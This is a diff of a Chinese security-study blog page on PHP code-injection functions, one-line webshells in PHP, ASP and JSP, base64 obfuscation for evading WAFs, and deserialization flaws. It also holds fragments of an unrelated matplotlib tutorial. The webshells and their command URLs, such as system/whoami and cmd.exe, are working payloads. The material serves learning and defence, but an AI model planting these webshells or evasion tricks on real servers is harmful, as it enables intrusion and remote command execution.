-    @assert($_GET[&#39;cmd&#39;]);   //使用GET方法需要在URL中手动传参。
-?&gt;
-
-例如：http://127.0.0.1/assert.php?cmd=system(&#39;phpinfo()&#39;)</code></pre>
-<p>eval()：将字符串当做PHP代码执行。</p>
-<p>preg_replace()：对字符串进行正则表达式的查找，如果查找到结果，则将结果替换为正则表达式的内容。（区别preg_match()：进行正则表达式的查找）</p>
-<pre><code>preg_replace(&quot;正则表达式&quot;,&quot;字符串&quot;,&quot;若匹配成功后替换的字符串&quot;)</code></pre>
-<p>create_function()：用户利用该函数创造自定义函数</p>
+<h3 id="代码注入漏洞的测试与利用"><a href="#代码注入漏洞的测试与利用" class="headerlink" title="代码注入漏洞的测试与利用"></a>代码注入漏洞的测试与利用</h3><p>PHP常见的够执行代码的函数：eval()、assert()、preg_repace()、create_function()等</p>
+<h4 id="案例1-eval函数"><a href="#案例1-eval函数" class="headerlink" title="案例1 eval函数"></a>案例1 eval函数</h4><p>eval函数会将字符串作为PHP代码执行，如常见的一句话后门程序：</p>
+<pre><code>&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;</code></pre>
+<h4 id="案例2-assert-函数"><a href="#案例2-assert-函数" class="headerlink" title="案例2 assert() 函数"></a>案例2 assert() 函数</h4><p><strong>验证assert后面的括号里的代码是否为true的函数。</strong>如果表达式不为true，那么则会给一个warning的警告<br>如：&lt;?php assert(‘1==2’);?&gt;<br>则会提醒：PHP Warning:  assert(): Assertion “1==2” failed in /usercode/file.php on line 1。<br>代码注入（对输入的数据过滤不严谨）：</p>
+<pre><code>assert.php?cmd=phpinfo() &lt;?php assert($_GET[&quot;cmd&quot;]);?&gt;</code></pre>
+<h4 id="案例3-preg-replace-函数-PHP-lt-5-5"><a href="#案例3-preg-replace-函数-PHP-lt-5-5" class="headerlink" title="案例3 preg_replace() 函数,PHP&lt;=5.5"></a>案例3 preg_replace() 函数,PHP&lt;=5.5</h4><p><strong>执行一个正则表达式的搜索和替换</strong><br>mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])<br>搜索subject中匹配pattern的部分， 以replacement进行替换。<br><strong>当第一个参数的正则表达式有e修正符的时候，第二个参数的字符串当做PHP代码执行。</strong></p>
+<pre><code>preg_replace.php?cmd=phpinfo() &lt;?echo preg_replace(&quot;/test/e&quot;,$_GET[&quot;cmd&quot;],&quot;jutst test&quot;);?&gt;</code></pre>
+<h4 id="案例4-create-function-函数"><a href="#案例4-create-function-函数" class="headerlink" title="案例4  create_function() 函数"></a>案例4  create_function() 函数</h4><p>php用户自定义函数 create_function()</p>
 <pre><code>/*   注释掉后面的所有代码
 &lt;?php 
 //?code = 2;&#125;phpinfo();/*
@@ -213,18 +536,125 @@ $str2 = &#39;echo test&#39;.$code.&quot;;&quot;;
 echo $str2;
 //$str2=echo test2;&#125;phpinfo();/*
 $func = create_function(&#39;$code&#39;,$str2);
-
+?&gt;
 相当于：
 function FT($code)&#123;
     echo test2;&#125;phpinfo();/*
+&#125;</code></pre>
+<h4 id="案例5：-array-map函数"><a href="#案例5：-array-map函数" class="headerlink" title="案例5： array_map函数"></a>案例5： array_map函数</h4><p>为数组的每个元素应用回调函数。</p>
+<pre><code class="php">array array_map(callable $callback , array $array1[,array $...])</code></pre>
+<p>array_map()：返回的结果是一个数组，由array1 每个元素应用 callback函数之后的结果组成。 callback 函数形参的数量和传给 array_map() 数组数量要一致。</p>
+<p>例如：</p>
+<pre><code class="php">&lt;?php
+function cube($n)
+&#123;
+    return($n * $n * $n);
 &#125;
-?&gt;</code></pre>
-<p>array_map函数、print_r()类似于echo，但会产生换行。</p>
-<p>call_user_func </p>
-<p>call_user_func_array</p>
-<p>ASP一句话木马</p>
-<p>wscript.exe文件</p>
-<h3 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h3><p>（1）能够绕过WAF的一句话木马：关键字检测</p>
+$a = array(1,2,3,4,5);
+$b = array_map(&quot;cube&quot;,$a);
+print_r($b);
+?&gt;
+
+/*
+Array&#123;
+[0]==&gt;1
+[1]==&gt;8
+[2]==&gt;27
+[3]==&gt;64
+[4]==&gt;125
+&#125;
+*/</code></pre>
+<pre><code class="php">&lt;?php
+    $evil_func = $_POST[func];
+    $evil_cmd = $_POST[cmd];
+    $some_array[0]=$evil_cmd;
+    $new_array = array_map($evil_func,$some_array);
+?&gt;
+ //POST传参：func=system&amp;cmd=whoami</code></pre>
+<h4 id="案例6：call-user-func函数"><a href="#案例6：call-user-func函数" class="headerlink" title="案例6：call_user_func函数"></a>案例6：call_user_func函数</h4><p>call_user_func是PHP的内置函数，该函数允许用户调用直接写的函数并传入一定的参数。</p>
+<pre><code class="php">&lt;?php
+//定义一个函数
+function nowamagic($a,$b)&#123;
+    echo $a;
+    echo $b;
+&#125;
+//call_user_func调用nowamagic
+call_user_func(&#39;nowamagic&#39;,&quot;111&quot;,&quot;222&quot;);
+call_user_func(&#39;nowamagic&#39;,&quot;333&quot;,&quot;444&quot;);
+?&gt;
+//输出111222333444</code></pre>
+<pre><code class="php">&lt;?php
+    $a = $_POST[func];
+    $b = $_POST[cmd];
+    call_user_func($a, $b);
+?&gt;
+ //POST传参：func=system&amp;cmd=whoami</code></pre>
+<p>案例7： call_user_func_array函数</p>
+<p>call_user_func_array函数和call_user_func很相似，只不过是换了一种方式传递了参数，让参数的结构更清晰。</p>
+<pre><code class="php">&lt;?php
+function a($b,$c)&#123;
+    echo $b;
+    echo $c;
+&#125;
+call_user_func_array(&#39;a&#39;,array(&quot;111&quot;,&quot;222&quot;));
+?&gt;
+//输出111222</code></pre>
+<pre><code class="php">&lt;?php
+    $a = $_POST[func];
+    $b = $_POST[cmd];
+    call_user_func_array($a, array($b));
+?&gt;
+ //POST传参：func=system&amp;cmd=whoami</code></pre>
+<h2 id="一句话木马原理及利用"><a href="#一句话木马原理及利用" class="headerlink" title="一句话木马原理及利用"></a>一句话木马原理及利用</h2><p>（1）WEBSHELL又称网页木马文件，根据开发语言的不同又分为ASP木马、PHP木马、JSP木马等，该类木马利用了脚本语言中的系统命令执行、文件读写等函数的功能，一旦上传到服务器被脚本引擎解析，攻击者就可以实现对服务器的控制。<br>（2）一句话木马 因其短小精悍不易被过滤又能与中国菜刀等工具配合使用的优势，成为了业界最使用的WEBshell类型。</p>
+<pre><code>PHP一句话木马：
+&lt;?php @eval($_POST[&#39;v&#39;]);?&gt;
+
+JSP一句话木马：
+&lt;%if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getReal
+Path(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());%&gt;
+
+ASP一句话木马：
+&lt;% eval request(&quot;v&quot;)%&gt;</code></pre>
+<h3 id="代码注入-1"><a href="#代码注入-1" class="headerlink" title="代码注入"></a>代码注入</h3><h4 id="PHP一句话木马"><a href="#PHP一句话木马" class="headerlink" title="PHP一句话木马"></a>PHP一句话木马</h4><p>PHP木马：</p>
+<pre><code>&lt;?php @eval($_POST[&#39;v&#39;]);?&gt;</code></pre>
+<p>evfal()函数会将参数作为PHP代码进行执行，因此通过参数V提交要执行的代码即可完成漏洞利用。</p>
+<p><img src="https://i.loli.net/2021/05/19/ikYMy2jREs3NTvC.png" alt="image-20210519231642691"></p>
+<h4 id="ASP一句话木马"><a href="#ASP一句话木马" class="headerlink" title="ASP一句话木马"></a>ASP一句话木马</h4><p>ASP木马：</p>
+<pre><code>&lt;%eval request(&quot;cmd&quot;)%&gt;</code></pre>
+<p>EVAL函数会将参数作为ASP代码进行执行，因此通过参数cmd提交要执行的代码即可完成漏洞利用。</p>
+<pre><code>http://10.10.10.135/1.asp?cmd=Execute(&quot;response.write 
+server.createobject(&quot;&quot;wscript.shell&quot;&quot;).exec(&quot;&quot;cmd.exe /c ipconfig&quot;&quot;).stdout.readall&quot;)</code></pre>
+<p><img src="https://i.loli.net/2021/05/19/RpfkmZXASMs3KFn.png" alt="image-20210519231857277"></p>
+<h4 id="JSP一句话木马"><a href="#JSP一句话木马" class="headerlink" title="JSP一句话木马"></a>JSP一句话木马</h4><pre><code>&lt;%if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getReal
+Path(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());%&gt;
+
+http://localhost/1.jsp?f=1.txt&amp;t=hello</code></pre>
+<p>JSP一句话木马可以向网站提交任意JSP代码并生成脚本文件</p>
+<pre><code>http://10.10.10.15:8080/2.jsp?pwd=023&amp;i=ipconfig</code></pre>
+<h3 id="过狗一句话原理"><a href="#过狗一句话原理" class="headerlink" title="过狗一句话原理"></a>过狗一句话原理</h3><p>（1）过狗常要用到三个函数：</p>
+<pre><code>str_replace(&#39;aa&#39;,&#39;a&#39;,$a); 
+ //1.被替换内容 2.用作替换内容 3.替换的内容
+base64_encode();         //加密
+base64_decode();         //解密</code></pre>
+<p>（2）原理：对一句话木马中的危险的回调函数assert等进行base64加密然后插入随便字符，然后用str_replace()函数替换，绕来绕去还是替换成assert($_POST[“v”]);的base64加密，然后再解密，就可以了。</p>
+<p><img src="https://i.loli.net/2021/05/19/bXK56NxCut9dgfi.png" alt="image-20210519232718097"></p>
+<h4 id="编写思路"><a href="#编写思路" class="headerlink" title="编写思路"></a>编写思路</h4><p>（1）准备好普通的一句话</p>
+<pre><code>assert($_POST[&quot;cmd&quot;]);</code></pre>
+<p>（2）对其中的危险性函数assert进行base64编码</p>
+<pre><code>base64编码：YXNzZXJ0
+加入混淆字符：YXNthinkingzZXJoeVatteJ0</code></pre>
+<p>（3）对YXNthinkingzZXJoeVatteJ0再次base64编码</p>
+<pre><code>WVhOdGhpbmtpbmd6WlhKb2VWYXR0ZUow</code></pre>
+<p>（4）对上述代码使用gzdeflate()对数据进行压缩</p>
+<pre><code>gzdeflate(&#39;WVhOdGhpbmtpbmd6WlhKb2VWYXR0ZUow&#39;);</code></pre>
+<p>（5）使用base64_decode和gzinflate进行嵌套，先解压缩再进行base64解码，再把值传入变量中(1-5的步骤主要是做了混淆处理)到这一步变量的值已经转回：YXNthinkingzZXJoeVatteJ0</p>
+<p>（6）定义函数将 YXNthinkingzZXJoeVatteJ0转化为assert：</p>
+<pre><code>base64_decode(YXNthinkingzZXJoeVatteJ0)
+</code></pre>
+<p>（7）经过函数的处理(cl)后cl($data)返回的值为assert，然后进行拼接，得到$a(@$_POST[‘cmd’]); </p>
+<p><strong>说明</strong>：str_replace($step_2,$step_1,$data); 的意思是在,$data数据里面寻找$step_2数组里面的数据，并使用$step_1数组的数据进行替换，且替换是数组中位置一一对应的。处理后得到的是YXNzZXJ0，再使用base64解码下就得到assert，并把assert返回到调用函数的位置。经过1-7的步骤：</p>
+<pre><code>$a(@$_POST[&#39;cmd&#39;]); == assert(@$_POST[&#39;cmd&#39;]);</code></pre>
+<h4 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h4><p>（1）能够绕过WAF的一句话木马：关键字检测</p>
 <pre><code>assert进行base64编码得YXNzZXJ0
 $a = YXNzadminZXJ0;
 $b = str_replace(&#39;admin&#39;,&#39;&#39;,$a);
@@ -243,9 +673,182 @@ $b();
 <p>（3）可使用异或的方法绕过。在PHP中^符号代表异或，相同为0，相异为1。</p>
 <pre><code>echo &quot; &quot; ^ &quot;a&quot; //空格和a异或，得到结果为A
 echo &quot; b&quot; ^ &quot;a &quot; //空格和a异或，b和空格异或，得到结果为AB</code></pre>
-<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>（1）序列化：(serialize)将对象的信息以字符串的形式保存起来。不会对类中的方法进行序列化，只会对类中的属性进行序列化。</p>
+<h2 id="PHP反序列化命令执行"><a href="#PHP反序列化命令执行" class="headerlink" title="PHP反序列化命令执行"></a>PHP反序列化命令执行</h2><p>（1）序列化 (Serialization)是一种将对象的状态信息转换为可以存储或传输的形式的过程（转化为信息流）。在序列化期间，对象将其当前状态写入到临时或持久性存储区以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。</p>
+<pre><code class="php">&lt;?php
+    class student&#123;
+        public $name = &#39;xiaoming&#39;;
+        public $age = 20;
+        public $score = 60;
+&#125;
+$A = new student();     //创建对象
+$A -&gt; name = &#39;sr&#39;;     //给对象name属性赋值
+$un1 = serialize($A);     //序列化
+echo $un1;
+$un2 = var_dump(unserialize($un1));    //反序列化
+/*
+var_dump是PHP中的调试函数，用于判断一个变量的类型与长度，并输出变量的数值。用var_dump打印所有的对象，可以查看对象内部的数据结构；var_dump里面的变量必须是存在的。
+*/
+echo $un2; //或者print_r($un2);
+?&gt;
+//序列化内容：O:7:&quot;student&quot;:3:&#123;s:4:&quot;name&quot;;s:2:&quot;sr&quot;;s:3:&quot;age&quot;;i:20;s:5:&quot;score&quot;;i:60;&#125;
+//反序列化内容：
+object(student)#2 (3) &#123;
+  [&quot;name&quot;]=&gt;
+  string(2) &quot;sr&quot;
+  [&quot;age&quot;]=&gt;
+  int(20)
+  [&quot;score&quot;]=&gt;
+  int(60)
+&#125;</code></pre>
+<p><img src="https://i.loli.net/2021/05/20/zXFf1i8bOaCqKsN.png" alt="image-20210520155326069"></p>
+<p>（2）序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。unserialize()函数能够重新把字符串变回php原来的值。</p>
+<h3 id="序列化的目的"><a href="#序列化的目的" class="headerlink" title="序列化的目的"></a>序列化的目的</h3><p>（1）以某种存储形式使自定义对象持久化</p>
+<ul>
+<li>比如说刚才的类里面保存着学生的个人信息，我想要将这些信息保存起来，以后可以随时取出来用，就可以采用序列化。将一个Word保存为docx，这就是序列化的过程。打开docx文档，显示内容，就是反序列化的过程。</li>
+</ul>
+<p>（2）将对象从一个地方传递到另一个地方</p>
+<ul>
+<li>比如说在进行网络传输的过程中，发送数据和接收数据都是通过byte[]来获取的时候，如果你要发送一个对象，需要进行序列化。 然后接受数据的时候进行反序列化，还原对象。</li>
+</ul>
+<p>（3）使程序更具维护性</p>
+<ul>
+<li>序列化可以将内存中的对象保存到本地文件和数据库中，大大提高了代码的可维护性。</li>
+</ul>
+<h3 id="序列化的基本用法"><a href="#序列化的基本用法" class="headerlink" title="序列化的基本用法"></a>序列化的基本用法</h3><p>（1）O:7:”student”:3:{s:4:”name”;s:8:”xiaoming”;s:3:”age”;i:20;s:5:”score”;i:60;}</p>
+<pre><code>O:对象名长度:“对象名”:对象成员变量个数:&#123;变量1类型:变量名1长度:”变量名
+1“;参数1类型:参数1长度:”参数1“;变量2类型:变量名2长度:“变量名2”;参数2类
+型:参数2长度:”参数2“;… …&#125;</code></pre>
+<p><img src="https://i.loli.net/2021/05/20/q2hM54WLzOpmsn3.png" alt="image-20210520162534792"></p>
+<p>（2）序列化：serialize()使用函数serialize()序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 </p>
+<p>（3）反序列化：unserialize()unserialize() 对已序列化的变量进行操作，重新生成一个对象。</p>
+<h3 id="反序列化漏洞原理"><a href="#反序列化漏洞原理" class="headerlink" title="反序列化漏洞原理"></a>反序列化漏洞原理</h3><p>（1）漏洞的根源在于unserialize()函数的参数可控。如果反序列化对象中存在魔术方法，而且<strong>魔术方法</strong>中的代码有能够被我们控制，漏洞就这样产生了，根据不同的代码可以导致各种攻击，如代码注入、SQL注入、目录遍历等等。</p>
+<p>（2）PHP的类中可能会包含一些特殊的函数叫魔术函数，魔术函数命名是以符号__开头的，比如：</p>
+<pre><code>__construct(), __destruct() __call(), __callStatic() __get(), __set() __isset(), __unset() __sleep(), __wakeup() __toString() __invoke() __set_state() __clone() __debugInfo()</code></pre>
+<p>（3）这些函数在某些情况下会自动调用，其中，反序列化漏洞主要由以下面魔术方法造成：</p>
+<ul>
+<li><strong>__construct()：在对象创建时自动被调用；</strong></li>
+<li> __sleep()：在对象序列化的时候自动被调用；</li>
+<li>__destruct()：在脚本运行结束时自动被调用；</li>
+<li><strong>__wakeup()：在反序列化为对象时自动被调用；</strong></li>
+<li>__toString()： 直接输出对象引用时自动被调用；</li>
+</ul>
+<p>（4）__sleep()</p>
+<p><img src="https://i.loli.net/2021/05/20/Ge6B3PQHigwWICL.png" alt="image-20210520163201001"></p>
+<p>（5）__wakeup()</p>
+<p><img src="https://i.loli.net/2021/05/20/xSEsJ7DhnciReCV.png" alt="image-20210520163240789"></p>
+<p>（6）__destruct()</p>
+<p><img src="https://i.loli.net/2021/05/20/TS7NPbkzrmv4EVI.png" alt="image-20210520163308195"></p>
+<p>（7）__tostring()</p>
+<p><img src="https://i.loli.net/2021/05/20/ZJrNW3VRyBPzMXH.png" alt="image-20210520163330738"></p>
+<h3 id="反序列化漏洞的示例"><a href="#反序列化漏洞的示例" class="headerlink" title="反序列化漏洞的示例"></a>反序列化漏洞的示例</h3><p>（1）反序列化导致任意文件读取。以get方式传参，若要获取1.txt 的内容，先将public $filename=’1.txt’ 时的属性进行序列化。</p>
+<p><img src="https://i.loli.net/2021/05/20/vIcHUGwF3WlxLgf.png" alt="image-20210520172039782"></p>
+<pre><code class="php">&lt;?php
+    class FileClass&#123;
+    public $filename = &#39;1.txt&#39;;
+    public function __toString()&#123;
+        return file_get_contents($this-&gt;filename);
+    &#125;
+&#125;
+$file = new FileClass();
+$a = serialize($file);
+echo $a;
+?&gt;
+// 输入序列化的结果为：O:9:&quot;FileClass&quot;:1:&#123;s:8:&quot;filename&quot;;s:5:&quot;1.txt&quot;;&#125;</code></pre>
+<p>在前端以GET方法传输序列化结果。</p>
+<pre><code class="php">&lt;?php
+    class FileClass&#123;
+    public $filename = &#39;error.log&#39;;
+    public function __toString()&#123;
+        return file_get_contents($this-&gt;filename);
+    &#125;
+&#125;
+$obj = unserialize($_GET[&#39;file&#39;]);
+echo $obj;
+?&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/05/20/NDLdZaJiMkSqz7t.png" alt="image-20210520172121942"></p>
+<p>（2）利用反序列化写入文件</p>
+<pre><code class="php">&lt;?php
+    class A&#123;
+    var $a = &quot;&lt;?php phpinfo();?&gt;&quot;;
+    function __destruct()&#123;
+        $fp = fopen(&quot;D:\\SecurityTools\\phpStudy\\phpstudy_pro\\WWW\\hello.php&quot;,&quot;w&quot;);
+        fputs($fp,$this-&gt;a);
+        fclose($fp);
+    &#125;
+&#125;
+$file = new A();
+$a = serialize($file);
+echo $a;
+?&gt;
+// 得到序列化结果为O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;</code></pre>
+<p>在前端以post方法传输序列化结果</p>
+<pre><code class="php">&lt;?php
+    class A&#123;
+    var $a = &quot;&lt;?php phpinfo();?&gt;&quot;;
+    function __destruct()&#123;
+        $fp = fopen(&quot;D:\\SecurityTools\\phpStudy\\phpstudy_pro\\WWW\\hello.php&quot;,&quot;w&quot;);
+        fputs($fp,$this-&gt;a);
+        fclose($fp);
+    &#125;
+&#125;
+$test = $_POST[&#39;test&#39;];
+$test_unser = unserialize($test);
+?&gt;</code></pre>
+<p><img src="https://i.loli.net/2021/05/20/VyeszLBMiJokHNK.png" alt="image-20210520174349587"></p>
+<p><img src="https://i.loli.net/2021/05/20/6cRVwHtk1JNjiU4.png" alt="image-20210520174414040"></p>
+<p><img src="https://i.loli.net/2021/05/20/woOEyubeTHAh1Dr.png" alt="image-20210520174429339"></p>
+<p><img src="https://i.loli.net/2021/05/20/KuM3hCgY6IpD5kT.png" alt="image-20210520180942260"></p>
+<h2 id="扩展-1"><a href="#扩展-1" class="headerlink" title="扩展"></a>扩展</h2><p>RCE：</p>
+<ul>
+<li>remote command execution 远程命令执行，例如ipconfig–显示IP信息</li>
+<li>remote code execution 远程代码执行，例如echo 1–1</li>
+</ul>
+<p>注：文件上传也是RCE漏洞</p>
+<p>一句话木马工作流程：</p>
+<ul>
+<li>利用eval等危险函数引发远程代码执行，执行任意的PHP代码。</li>
+<li>利用PHP代码中的shell_exec、system等危险函数触发远程命令执行，查看电脑上的所有文件，并且可以执行系统命令，拿到了系统的权限</li>
+</ul>
+<pre><code>菜刀工具一般只能用POST方式传参。
+万能写法：
+&lt;?php
+    @eval($_REQUEST[&#39;cmd&#39;]);   //request可以接受get、post、cookie传的参数
+?&gt;</code></pre>
+<p>常见代码执行函数：</p>
+<p>assert()  断言。将字符串当作代码执行一次进行判断，判断是否为True。</p>
+<pre><code>&lt;?php
+    @assert($_GET[&#39;cmd&#39;]);   //使用GET方法需要在URL中手动传参。
+?&gt;
+
+例如：http://127.0.0.1/assert.php?cmd=system(&#39;phpinfo()&#39;)</code></pre>
+<p>preg_replace()：对字符串进行正则表达式的查找，如果查找到结果，则将结果替换为正则表达式的内容。（区别preg_match()：进行正则表达式的查找）</p>
+<pre><code>preg_replace(&quot;正则表达式&quot;,&quot;字符串&quot;,&quot;若匹配成功后替换的字符串&quot;)</code></pre>
+<p>array_map函数、print_r()类似于echo，但会产生换行。</p>
+<p>call_user_func </p>
+<p>call_user_func_array</p>
+<p>ASP一句话木马</p>
+<p>wscript.exe文件</p>
+<h3 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h3><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>（1）序列化：(serialize)将对象的信息以字符串的形式保存起来。不会对类中的方法进行序列化，只会对类中的属性进行序列化。</p>
 <p>（2）反序列化：将字符串重新创建回对象。</p>
 <p>（3）当该对象需要进行反序列化操作且存在魔术方法时，反序列化会自动执行魔术方法。</p>
+<p>（4）魔术方法：在PHP序列化和反序列化中，会自动调用的某些函数。</p>
+<p>（5）如果在某个类中定义了魔术方法的使用，那么这个魔术方法不管是否被调用，在某个序列化或者反序列化的阶段将会被执行。</p>
+<p>file_get_contents($File)：读取File文件中的内容。</p>
+<p>file_put_contents($File,$Contents)：在File文件中写入Contents的内容。</p>
+<h3 id="CTF中的反序列化"><a href="#CTF中的反序列化" class="headerlink" title="CTF中的反序列化"></a>CTF中的反序列化</h3><pre><code class="php">_destrunt()&#123;
+    echo $fp1;
+&#125;
+_sleep()&#123;
+    echo $fp2
+&#125;</code></pre>
+<p>POP链：通过一个类去调用另一个类</p>
+<pre><code>function cl  ($data)&#123;
+    $step_1 = array(&#39;&#39;,&#39;&#39;);
+    $step_2 = array(&#39;thinking&#39;,&#39;JoeVatte&#39;);
+    $step_3 = str_replace($step_2,$step_1,$data);
+    $step_4 = base64_decode($step_3);
+   return $step_4;
+&#125;</code></pre>
 
       
 
@@ -420,6 +1023,7 @@ http(s)://example.com
 http(s)://example.com/file.php?var1=val1&amp;var2=val2
 http(s)://user:password@example.com</code></pre>
 <p><img src="https://i.loli.net/2021/05/15/KeoqBEuJCrF3DVT.png" alt="image-20210515185029881"></p>
+<p>（6）注：攻击者服务器上的木马文件后缀名设置为txt。</p>
 <h3 id="PHP封装协议"><a href="#PHP封装协议" class="headerlink" title="PHP封装协议"></a>PHP封装协议</h3><p>（1）利用<strong>php伪协议</strong>可以使得<strong>本地文件包含</strong>执行自定义的php代码。PHP伪协议（需要allow_url_include为on </p>
 <ul>
 <li>php://input</li>
@@ -2566,1052 +3170,6 @@ union select 查询</code></pre>
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/04/18/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Python/运用Python语言(四)-科学计算和可视化02" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/04/16/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E5%9B%9B)-%E7%A7%91%E5%AD%A6%E8%AE%A1%E7%AE%97%E5%92%8C%E5%8F%AF%E8%A7%86%E5%8C%9602/">运用Python语言(四)-科学计算和可视化02</a>
-    </h1>
-  
-
-        
-        <a href="/2021/04/16/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E5%9B%9B)-%E7%A7%91%E5%AD%A6%E8%AE%A1%E7%AE%97%E5%92%8C%E5%8F%AF%E8%A7%86%E5%8C%9602/" class="archive-article-date">
-  	<time datetime="2021-04-16T09:54:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="matplotlib库的使用"><a href="#matplotlib库的使用" class="headerlink" title="matplotlib库的使用"></a>matplotlib库的使用</h2><p><strong>matplotlib是提供数据绘图功能的第三方库，其pyplot子库主要用于实现各种数据展示图形的绘制</strong></p>
-<h3 id="matplotlib-pyplot库概述"><a href="#matplotlib-pyplot库概述" class="headerlink" title="matplotlib.pyplot库概述"></a>matplotlib.pyplot库概述</h3><p>（1）matplotlib.pyplot是matplotlib的子库，引用方式如下：</p>
-<pre><code class="python">&gt;&gt;&gt;import matplotlib.pyplot as plt #后续程序中，plt将代替matplotlib.pyplot</code></pre>
-<p>（2）为了正确显示中文字体，使用以下代码更改默认设置，其中’SimHei’表示黑体字。</p>
-<pre><code class="python">&gt;&gt;&gt; import matplotlib
-&gt;&gt;&gt; matplotlib.rcParams[&#39;font.family&#39;]=&#39;SimHei&#39;
-&gt;&gt;&gt; matplotlib.rcParams[&#39;font.sans-serif&#39;] = [&#39;SimHei&#39;]</code></pre>
-<p>（3）字体名称的中英文对照</p>
-<table>
-<thead>
-<tr>
-<th align="center">字体名称</th>
-<th align="center">字体英文表示</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">宋体</td>
-<td align="center">SimSun</td>
-</tr>
-<tr>
-<td align="center">黑体</td>
-<td align="center">SimHei</td>
-</tr>
-<tr>
-<td align="center">楷体</td>
-<td align="center">KaiTi</td>
-</tr>
-<tr>
-<td align="center">微软雅黑</td>
-<td align="center">Microsoft YaHei</td>
-</tr>
-<tr>
-<td align="center">隶书</td>
-<td align="center">LiSu</td>
-</tr>
-<tr>
-<td align="center">仿宋</td>
-<td align="center">FangSong</td>
-</tr>
-<tr>
-<td align="center">幼圆</td>
-<td align="center">YouYuan</td>
-</tr>
-<tr>
-<td align="center">华文宋体</td>
-<td align="center">STSong</td>
-</tr>
-<tr>
-<td align="center">华文黑体</td>
-<td align="center">STHeiti</td>
-</tr>
-<tr>
-<td align="center">苹果丽中黑</td>
-<td align="center">Apple LiGothic Medium</td>
-</tr>
-</tbody></table>
-<p>（4）matplotlib库由一系列有组织有隶属关心的对象构成，对于基础绘图操作来说过于复杂。因此matplotlib提供了一套快捷命令式的绘图接口函数，<strong>即pyplot子模块</strong>。</p>
-<p>（5）pyplot将绘图所需要的对象构建过程封装在函数中，对用户提供了更加友好的接口。pyplot模块提供一批预定义的绘图函数，大多数函数可以从函数名辨别它的功能。</p>
-<h3 id="matplotlib-pyplot库解析"><a href="#matplotlib-pyplot库解析" class="headerlink" title="matplotlib.pyplot库解析"></a>matplotlib.pyplot库解析</h3><p>（1）以下内容使用plt代替matplotlib.pyplot。plt子库提供了一批操作和绘图函数，每个函数代表对图像进行的一个操作，比如创建绘图区域、添加标注或修改坐标轴等。这些函数采用了plt.&lt;b&gt;()形式调用，其中&lt;b&gt;是具体函数名称。</p>
-<p>（2）plt子库中包含了4个与绘图区域有关的函数，如下表所示。</p>
-<table>
-<thead>
-<tr>
-<th align="center">函数</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">plt.figure(figsize=None,facecolor=None)</td>
-<td align="center">创建一个全局绘图区域</td>
-</tr>
-<tr>
-<td align="center">plt.axes(rect,axisbg=’w’)</td>
-<td align="center">创建一个坐标系风格的子绘图区域，axisbg指背景色，默认为white</td>
-</tr>
-<tr>
-<td align="center">plt.subplot(nrows,ncols,plot_number)</td>
-<td align="center">在全局绘图区域中创建一个子绘图区域</td>
-</tr>
-<tr>
-<td align="center">plt.subplots_adjust()</td>
-<td align="center">调整子绘图区域的布局</td>
-</tr>
-</tbody></table>
-<p>（3）使用figure()函数创建一个全局绘图区域，并且使它成为当前的绘图对象，<strong>figsize参数可以指定绘图区域的宽度和高度，单位为英寸。</strong>鉴于figure()函数参数较多，这里采用指定参数名称的方式输入参数。</p>
-<pre><code class="python">plt.figure(figsize(8,4))</code></pre>
-<p>（4）绘制图像之前也不可调用figure()函数创建全局绘图区域，此时，plt子库会自动创建一个默认的绘图区域。显示绘图区域的代码如下：</p>
-<pre><code class="python">&gt;&gt;&gt;plt.figure(figsize(8,4))
-&gt;&gt;&gt;plt.show()</code></pre>
-<p>（5）<strong>subplot()**用于在全局绘图区域内创建子绘图区域，其参数表示将全局绘图区域分成</strong>nrows行和ncols列<strong>，并根据</strong>先行后列的计数方式**在plot_number位置生成一个坐标系。例如：</p>
-<pre><code class="python">&gt;&gt;&gt; plt.subplot(324)    #全局绘图区域被分割成3*2的表格，其中，在第4个位置绘制了一个坐标系。
-&gt;&gt;&gt; plt.show()</code></pre>
